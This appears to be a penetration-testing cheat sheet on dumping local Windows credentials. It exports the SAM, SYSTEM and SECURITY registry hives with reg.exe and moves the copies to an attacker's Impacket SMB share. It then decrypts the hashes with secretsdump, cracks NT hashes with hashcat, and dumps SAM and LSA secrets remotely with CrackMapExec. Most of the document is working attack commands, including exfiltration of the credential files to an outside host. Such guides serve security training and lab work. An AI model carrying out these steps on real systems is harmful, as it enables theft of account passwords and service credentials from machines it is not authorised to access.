# Attacking SAM (Local Credential Dumping)
**Concept:** The **Security Account Manager (SAM)** is a database file that stores local user accounts and passwords. 
**The Problem:** The SAM file (`C:\Windows\System32\config\SAM`) is locked by the OS while Windows is running. You cannot copy it directly. 
**The Solution:** We use the Windows Registry to create a "Save" of the hives, effectively exporting a backup copy that we can exfiltrate.
## 1. The Registry Hives (The Loot)
You need three specific hives to successfully extract passwords.

| **Hive**     | **Registry Path** | **Purpose**                                                                       |
| ------------ | ----------------- | --------------------------------------------------------------------------------- |
| *SAM*      | `HKLM\sam`        | **The Safe.** Contains the user hashes (encrypted).                               |
| *SYSTEM*   | `HKLM\system`     | **The Key.** Contains the **Boot Key** (SysKey) needed to decrypt the SAM.        |
| *SECURITY* | `HKLM\security`   | **The Bonus.** Contains **LSA Secrets** (Cached domain creds, service passwords). |
## 2. Manual Dumping (Living Off The Land)
**Context:** You have a shell (CMD/PowerShell) on the target. You will use the native `reg.exe` tool to export the hives.
```powershell
# 1. Create a temp directory
mkdir C:\Temp
cd C:\Temp

# 2. Save the hives (Must be Administrator)
reg.exe save hklm\sam C:\Temp\sam.save
reg.exe save hklm\system C:\Temp\system.save
reg.exe save hklm\security C:\Temp\security.save
```
## 3. Exfiltration (Impacket SMBServer)
**Context:** Getting files _off_ a Windows machine can be annoying. The easiest way is to spin up an SMB share on your Kali box and have the Windows target "push" the files to you.

**Attacker (Kali - Linux):**
```shell
# Start an SMB server in the current directory
# -smb2support: Crucial for Windows 10/Server 2016+ (SMBv1 is disabled)
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData $(pwd)
```

**Target (Windows):**
```powershell
# Move files to your attacker machine (IP 10.10.14.x)
move C:\Temp\sam.save \\10.10.14.x\CompData\
move C:\Temp\system.save \\10.10.14.x\CompData\
move C:\Temp\security.save \\10.10.14.x\CompData\
```
## 4. Extracting Hashes (Secretsdump)
**Context:** Now that you have the files on Kali, use `impacket-secretsdump` to combine the `SYSTEM` key with the `SAM` database and decrypt the hashes.
```shell
# Syntax: secretsdump.py -sam <sam> -system <system> -security <security> LOCAL
impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL
```

**Output Analysis:** The tool outputs hashes in `User:RID:LM:NT` format.
```txt
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
                                                     ^
                                             Target (NT Hash)
```

- **LM Hash:** `aad3...` (Usually empty/disabled on modern Windows).
- **NT Hash:** `31d6...` (This is what we crack or Pass-the-Hash).
## 5. Cracking (Hashcat)
**Goal:** Crack the NT hash to get the cleartext password.
```shell
# 1. Save only the NT hash (32 chars) to a file
echo "31d6cfe0d16ae931b73c59d7e0c089c0" > hashes.txt

# 2. Crack using Mode 1000 (NTLM)
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```
## 6. Remote Dumping (CrackMapExec)
**Context:** If you _already_ have valid Admin credentials (e.g., you found them in a script), you don't need to manually upload/download files. CME does it all in memory.

**Dumping SAM (Local Users):**
```shell
# Dump local account hashes
crackmapexec smb <TARGET_IP> -u <User> -p <Password> --sam
```

**Dumping LSA (Secrets):** This is often more valuable than SAM. It can contain service account passwords in cleartext or cached domain credentials (`MSCASH`).
```shell
# Dump LSA secrets
crackmapexec smb <TARGET_IP> -u <User> -p <Password> --lsa
```